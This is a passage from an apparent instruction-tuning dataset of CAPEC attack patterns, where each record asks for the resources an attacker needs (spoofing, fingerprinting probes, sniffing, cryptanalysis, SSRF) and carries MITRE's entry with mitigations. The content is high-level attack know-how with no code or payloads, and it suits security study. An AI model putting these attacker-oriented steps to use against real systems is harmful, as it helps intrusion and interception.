      "Resources_Required": "The attacker must be able to manipulate the communications to the targeted application or service.",
      "@Name": "Web Services Protocol Manipulation (CAPEC ID: 278)",
      "attack_ptrn": {
        "@ID": "278",
        "@Name": "Web Services Protocol Manipulation",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary manipulates a web service related protocol to cause a web application or service to react differently than intended. This can either be performed through the manipulation of call parameters to include unexpected values, or by changing the called function to one that should normally be restricted or limited. By leveraging this pattern of attack, the adversary is able to gain access to data or resources normally restricted, or to cause the application or service to crash.",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "272"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The targeted application or service must rely on web service protocols in such a way that malicious manipulation of them can alter functionality."
        },
        "Resources_Required": {
          "Resource": "The attacker must be able to manipulate the communications to the targeted application or service."
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Range, size and value and consistency verification for any arguments supplied to applications and services from external sources and devise appropriate error response.",
            "Design: Ensure that function calls that should not be called by an unprivileged user are not accessible to them."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "707"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Prerequisites, Description Summary, Resources_Required, Solutions_and_Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Fake the Source of Data (CAPEC ID: 194)",
    "context": "",
    "output": "required resources:\nResources required vary depending on the nature of the attack. Possible tools needed by an attacker could include tools to create custom network packets, specific client software, and tools to capture network traffic. Many variants of this attack require no attacker resources, however.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Resources required vary depending on the nature of the attack. Possible tools needed by an attacker could include tools to create custom network packets, specific client software, and tools to capture network traffic. Many variants of this attack require no attacker resources, however.",
      "@Name": "Fake the Source of Data (CAPEC ID: 194)",
      "attack_ptrn": {
        "@ID": "194",
        "@Name": "Fake the Source of Data",
        "@Abstraction": "Standard",
        "@Status": "Stable",
        "Description": "An adversary takes advantage of improper authentication to provide data or services under a falsified identity. The purpose of using the falsified identity may be to prevent traceability of the provided data or to assume the rights granted to another individual. One of the simplest forms of this attack would be the creation of an email message with a modified \"From\" field in order to appear that the message was sent from someone other than the actual sender. The root of the attack (in this case the email system) fails to properly authenticate the source and this results in the reader incorrectly performing the instructed action. Results of the attack vary depending on the details of the attack, but common results include privilege escalation, obfuscation of other attacks, and data corruption/manipulation.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "151",
              "Exclude_Related": {
                "@Exclude_ID": "512"
              }
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "657"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "667"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "This attack is only applicable when a vulnerable entity associates data or services with an identity. Without such an association, there would be no reason to fake the source."
        },
        "Resources_Required": {
          "Resource": "Resources required vary depending on the nature of the attack. Possible tools needed by an attacker could include tools to create custom network packets, specific client software, and tools to capture network traffic. Many variants of this attack require no attacker resources, however."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Alter Execution Logic",
              "Note": "By faking the source of data or services, an adversary can cause a target to make incorrect decisions about how to proceed."
            },
            {
              "Scope": "Integrity",
              "Impact": "Gain Privileges",
              "Note": "By impersonating identities that have an increased level of access, an adversary gain privilege that they many not have otherwise had."
            },
            {
              "Scope": "Integrity",
              "Impact": "Hide Activities",
              "Note": "Faking the source of data or services can be used to create a false trail in logs as the target will associate any actions with the impersonated identity instead of the adversary."
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "287"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "WASC",
            "Entry_ID": "38",
            "Entry_Name": "URL Redirector Abuse"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Black Box Reverse Engineering (CAPEC ID: 189)",
    "context": "",
    "output": "required resources:\nBlack box methods require (at minimum) the ability to interact with the functional boundaries where the software communicates with a larger processing environment, such as inter-process communication on a host operating system, or via networking protocols.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Black box methods require (at minimum) the ability to interact with the functional boundaries where the software communicates with a larger processing environment, such as inter-process communication on a host operating system, or via networking protocols.",
      "@Name": "Black Box Reverse Engineering (CAPEC ID: 189)",
      "attack_ptrn": {
        "@ID": "189",
        "@Name": "Black Box Reverse Engineering",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary discovers the structure, function, and composition of a type of computer software through black box analysis techniques. 'Black Box' methods involve interacting with the software indirectly, in the absence of direct access to the executable object. Such analysis typically involves interacting with the software at the boundaries of where the software interfaces with a larger execution environment, such as input-output vectors, libraries, or APIs. Black Box Reverse Engineering also refers to gathering physical side effects of a hardware device, such as electromagnetic radiation or sounds.",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "188"
          }
        },
        "Resources_Required": {
          "Resource": "Black box methods require (at minimum) the ability to interact with the functional boundaries where the software communicates with a larger processing environment, such as inter-process communication on a host operating system, or via networking protocols."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "203"
            },
            {
              "@CWE_ID": "1255"
            },
            {
              "@CWE_ID": "1300"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Activation_Zone, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Weaknesses, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2015-11-09",
            "#text": "Software Reverse Engineering"
          }
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: ICMP Error Message Quoting Probe (CAPEC ID: 329)",
    "context": "",
    "output": "required resources:\nA tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, \"Port Unreachable..",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, \"Port Unreachable..",
      "@Name": "ICMP Error Message Quoting Probe (CAPEC ID: 329)",
      "attack_ptrn": {
        "@ID": "329",
        "@Name": "ICMP Error Message Quoting Probe",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary uses a technique to generate an ICMP Error message (Port Unreachable, Destination Unreachable, Redirect, Source Quench, Time Exceeded, Parameter Problem) from a target and then analyze the amount of data returned or \"Quoted\" from the originating request that generated the ICMP error message.",
        "Extended_Description": {
          "xhtml:p": [
            "For this purpose \"Port Unreachable\" error messages are often used, as generating them requires the adversary to send a UDP datagram to a closed port on the target. The goal of this analysis to make inferences about the type of operating system or firmware that sent the error message in reply.",
            "This is useful for identifying unique characteristics of operating systems because the RFC-1122 expected behavior reads: \"Every ICMP error message includes the Internet header and at least the first 8 data octets of the datagram that triggered the error; more than 8 octets MAY be sent [...].\" This contrasts with RFC-792 expected behavior, which limited the quoted text to 64 bits (8 octets). Given the latitude in the specification the resulting RFC-1122 stack implementations often respond with a high degree of variability in the amount of data quoted in the error message because \"older\" or \"legacy\" stacks may comply with the RFC-792 specification, while other stacks may choose a longer format in accordance with RFC-1122. As a general rule most operating systems or firmware will quote the first 8 bytes of the datagram triggering the error, but some IP stacks will quote more than the first 8 bytes of data."
          ]
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "312"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card."
        },
        "Resources_Required": {
          "Resource": "A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, \"Port Unreachable.."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pg. 56"
            },
            {
              "@External_Reference_ID": "REF-123"
            },
            {
              "@External_Reference_ID": "REF-124"
            },
            {
              "@External_Reference_ID": "REF-262"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Cryptanalysis (CAPEC ID: 97)",
    "context": "",
    "output": "The resources required to execute Cryptanalysis (CAPEC ID: 97) are the following: Computing resource requirements will vary based on the complexity of a given cryptanalysis technique. Access to the encryption/decryption routines of the algorithm is also required.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Computing resource requirements will vary based on the complexity of a given cryptanalysis technique. Access to the encryption/decryption routines of the algorithm is also required.",
      "@Name": "Cryptanalysis (CAPEC ID: 97)",
      "attack_ptrn": {
        "@ID": "97",
        "@Name": "Cryptanalysis",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "Cryptanalysis is a process of finding weaknesses in cryptographic algorithms and using these weaknesses to decipher the ciphertext without knowing the secret key (instance deduction). Sometimes the weakness is not in the cryptographic algorithm itself, but rather in how it is applied that makes cryptanalysis successful. An attacker may have other goals as well, such as: Total Break (finding the secret key), Global Deduction (finding a functionally equivalent algorithm for encryption and decryption that does not require knowledge of the secret key), Information Deduction (gaining some information about plaintexts or ciphertexts that was not previously known) and Distinguishing Algorithm (the attacker has the ability to distinguish the output of the encryption (ciphertext) from a random permutation of bits).",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "192"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "20"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "An attacker discovers a weakness in the cryptographic algorithm or a weakness in how it was applied to a particular chunk of plaintext."
            },
            {
              "Step": "2",
              "Phase": "Exploit",
              "Description": "An attacker leverages the discovered weakness to decrypt, partially decrypt or infer some information about the contents of the encrypted message. All of that is done without knowing the secret key."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The target software utilizes some sort of cryptographic algorithm.",
            "An underlying weaknesses exists either in the cryptographic algorithm used or in the way that it was applied to a particular chunk of plaintext.",
            "The encryption algorithm is known to the attacker.",
            "An attacker has access to the ciphertext."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "Cryptanalysis generally requires a very significant level of understanding of mathematics and computation."
          }
        },
        "Resources_Required": {
          "Resource": "Computing resource requirements will vary based on the complexity of a given cryptanalysis technique. Access to the encryption/decryption routines of the algorithm is also required."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data",
            "Note": "In most cases, if cryptanalysis is successful at all, an adversary will not be able to decrypt the entire message, but instead will only be able to deduce some information about the plaintext. However, that may be sufficient for an adversary, depending on the context of the attack."
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Use proven cryptographic algorithms with recommended key sizes.",
            {
              "xhtml:p": "Ensure that the algorithms are used properly. That means:",
              "xhtml:ul": {
                "xhtml:li": [
                  "1. Not rolling out your own crypto; Use proven algorithms and implementations.",
                  "2. Choosing initialization vectors with sufficiently random numbers",
                  "3. Generating key material using good sources of randomness and avoiding known weak keys",
                  "4. Using proven protocols and their implementations.",
                  "5. Picking the most appropriate cryptographic algorithm for your usage context and data"
                ]
              }
            }
          ]
        },
        "Example_Instances": {
          "Example": "A very easy to understand example is a cryptanalysis technique called frequency analysis that can be successfully applied to the very basic classic encryption algorithms that performed mono-alphabetic substitution replacing each letter in the plaintext with its predetermined mapping letter from the same alphabet. This was considered an improvement over a more basic technique that would simply shift all of the letters of the plaintext by some constant number of positions and replace the original letters with the new letter with the resultant alphabet position. While mono-alphabetic substitution ciphers are resilient to blind brute force, they can be broken easily with nothing more than a pen and paper. Frequency analysis uses the fact that natural language is not random and mono-alphabetic substitution does not hide the statistical properties of the natural language. So if the letter \"E\" in an English language occurs with a certain known frequency (about 12.7%), whatever \"E\" was substituted with to get to the ciphertext, will occur with the similar frequency. Having this frequency information allows the cryptanalyst to quickly determine the substitutions and decipher the ciphertext. Frequency analysis techniques are not applicable to modern ciphers as they are all resilient to it (unless this is a very bad case of a homegrown encryption algorithm). This example is inapplicable to modern cryptographic ciphers but is here to illustrate a rudimentary example of cryptanalysis."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "327"
            },
            {
              "@CWE_ID": "1204"
            },
            {
              "@CWE_ID": "1240"
            },
            {
              "@CWE_ID": "1241"
            },
            {
              "@CWE_ID": "1279"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "OWASP Attacks",
            "Entry_Name": "Cryptanalysis"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-556",
            "@Section": "Cryptanalysis"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Description, Description Summary, Examples-Instances, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Mitigations"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: TCP Sequence Number Probe (CAPEC ID: 321)",
    "context": "",
    "output": "required resources:\nA tool capable of sending and receiving packets from a remote system.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A tool capable of sending and receiving packets from a remote system.",
      "@Name": "TCP Sequence Number Probe (CAPEC ID: 321)",
      "attack_ptrn": {
        "@ID": "321",
        "@Name": "TCP Sequence Number Probe",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "This OS fingerprinting probe tests the target system's assignment of TCP sequence numbers. One common way to test TCP Sequence Number generation is to send a probe packet to an open port on the target and then compare the how the Sequence Number generated by the target relates to the Acknowledgement Number in the probe packet. Different operating systems assign Sequence Numbers differently, so a fingerprint of the operating system can be obtained by categorizing the relationship between the acknowledgement number and sequence number as follows: 1) the Sequence Number generated by the target is Zero, 2) the Sequence Number generated by the target is the same as the acknowledgement number in the probe, 3) the Sequence Number generated by the target is the acknowledgement number plus one, or 4) the Sequence Number is any other non-zero number.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "312"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card."
        },
        "Resources_Required": {
          "Resource": "A tool capable of sending and receiving packets from a remote system."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pg. 55-56"
            },
            {
              "@External_Reference_ID": "REF-128"
            },
            {
              "@External_Reference_ID": "REF-212",
              "@Section": "Chapter 8. Remote OS Detection"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Description, Description Summary, Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Sniffing Attacks (CAPEC ID: 157)",
    "context": "",
    "output": "The resources required to execute Sniffing Attacks (CAPEC ID: 157) are the following: The adversary must be able to intercept the transmissions containing the data of interest. Depending on the medium of transmission and the path the data takes between the sender and recipient, the adversary may require special equipment and/or require that this equipment be placed in specific locations (e.g., a network sniffing tool)",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary must be able to intercept the transmissions containing the data of interest. Depending on the medium of transmission and the path the data takes between the sender and recipient, the adversary may require special equipment and/or require that this equipment be placed in specific locations (e.g., a network sniffing tool)",
      "@Name": "Sniffing Attacks (CAPEC ID: 157)",
      "attack_ptrn": {
        "@ID": "157",
        "@Name": "Sniffing Attacks",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient. Sniffing Attacks are similar to Adversary-In-The-Middle attacks (CAPEC-94), but are entirely passive. AiTM attacks are predominantly active and often alter the content of the communications themselves.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "117",
              "Exclude_Related": {
                "@Exclude_ID": "514"
              }
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "652"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine Communication Mechanism] The adversary determines the nature and mechanism of communication between two components, looking for opportunities to exploit.",
              "Technique": "Look for application documentation that might describe a communication mechanism used by a target."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Position In Between Targets] The adversary positions themselves somewhere in the middle of the two components. If the communication is encrypted, the adversary will need to act as a proxy and route traffic between the components, exploiting a flaw in the encryption mechanism. Otherwise, the adversary can just observe the communication at either end.",
              "Technique": [
                "Use Wireshark or some other packet capturing tool to capture traffic on a network.",
                "Install spyware on a client that will intercept outgoing packets and route them to their destination as well as route incoming packets back to the client.",
                "Exploit a weakness in an encrypted communication mechanism to gain access to traffic. Look for outdated mechanisms such as SSL."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Listen to Communication] The adversary observes communication, but does not alter or block it. The adversary gains access to sensitive information and can potentially utilize this information in a malicious way."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The target data stream must be transmitted on a medium to which the adversary has access."
        },
        "Resources_Required": {
          "Resource": "The adversary must be able to intercept the transmissions containing the data of interest. Depending on the medium of transmission and the path the data takes between the sender and recipient, the adversary may require special equipment and/or require that this equipment be placed in specific locations (e.g., a network sniffing tool)"
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data"
          }
        },
        "Mitigations": {
          "Mitigation": "Encrypt sensitive information when transmitted on insecure mediums to prevent interception."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "311"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Activation_Zone, Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Resources_Required, Solutions_and_Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Execution_Flow"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Malware-Directed Internal Reconnaissance (CAPEC ID: 529)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Malware-Directed Internal Reconnaissance (CAPEC ID: 529):\nThe adversary requires a variety of tools to collect information about the target. These include port/network scanners and tools to analyze responses from applications to determine version and configuration information. Footprinting a system adequately may also take a few days if the attacker wishes the footprinting attempt to go undetected.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary requires a variety of tools to collect information about the target. These include port/network scanners and tools to analyze responses from applications to determine version and configuration information. Footprinting a system adequately may also take a few days if the attacker wishes the footprinting attempt to go undetected.",
      "@Name": "Malware-Directed Internal Reconnaissance (CAPEC ID: 529)",
      "attack_ptrn": {
        "@ID": "529",
        "@Name": "Malware-Directed Internal Reconnaissance",
        "@Abstraction": "Standard",
        "@Status": "Stable",
        "Description": "Adversary uses malware or a similarly controlled application installed inside an organizational perimeter to gather information about the composition, configuration, and security mechanisms of a targeted application, system or network.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "169",
            "Exclude_Related": {
              "@Exclude_ID": "512"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": "The adversary must have internal, logical access to the target network and system."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "The adversary must be able to obtain or develop, as well as place malicious software inside the target network/system."
          }
        },
        "Resources_Required": {
          "Resource": "The adversary requires a variety of tools to collect information about the target. These include port/network scanners and tools to analyze responses from applications to determine version and configuration information. Footprinting a system adequately may also take a few days if the attacker wishes the footprinting attempt to go undetected."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Keep patches up to date by installing weekly or daily if possible.",
            "Identify programs that may be used to acquire peripheral information and block them by using a software restriction policy or tools that restrict program execution by using a process allowlist."
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Mitigations"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Server Side Request Forgery (CAPEC ID: 664)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Server Side Request Forgery (CAPEC ID: 664):\n[None] No specialized resources are required to execute this type of attack.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "[None] No specialized resources are required to execute this type of attack.",
      "@Name": "Server Side Request Forgery (CAPEC ID: 664)",
      "attack_ptrn": {
        "@ID": "664",
        "@Name": "Server Side Request Forgery",
        "@Abstraction": "Standard",
        "@Status": "Stable",
        "Description": {
